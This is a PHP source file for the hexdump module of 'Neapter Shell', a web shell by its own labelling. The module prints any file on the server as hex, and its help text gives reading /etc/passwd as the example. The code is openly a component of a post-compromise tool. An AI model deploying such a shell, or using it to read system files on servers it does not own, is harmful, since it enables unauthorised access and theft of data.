<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Hexdump
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleHexdump extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'hexdump',
            'hd'
        );
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-17 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Wyświetlanie plików w formacie szesnastkowym

	Użycie:
		hexdump ścieżka_do_pliku

	Przykład:
		hexdump /etc/passwd
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() === 0) {
            return self::getHelp();
        }

        $sFileName = $this->oArgs->getParam(0);

        if (!($rFile = @fopen($sFileName, 'r'))) {
            return sprintf('Nie można otworzyć pliku "%s"', $sFileName);
        }

        $i = 0;
        $sOutput = '';

        $iLast = 0;

        while (!feof($rFile)) {
            $sData = fread($rFile, 16);

            /* Hex address */
            $sLine = sprintf("%08x  ", $i);

            /* Hex value*/
            $iLength = strlen($sData);
            for ($j = 0; $j < $iLength; $j++) {
                $sLine .= bin2hex($sData[$j]) . ' ';

                if ($j === 7) {
                    $sLine .= ' ';
                }
            }

            $sLine = str_pad($sLine, 60, ' ', STR_PAD_RIGHT);

            /* Value */
            $sLine .= sprintf(
                "|%s|\r\n",
                htmlspecialchars(preg_replace('~[^\x20-\x7f]~', '.', $sData))
            );

            $iLast = strlen($sData);

            $i += 16;

            $sOutput .= $sLine;
        }

        if ($iLast != 16) {
            $i = $i - 16 + $iLast;
            $sOutput .= str_pad(base_convert($i, 10, 16), 8, '0', STR_PAD_LEFT);
        }

        return $sOutput;
    }
}
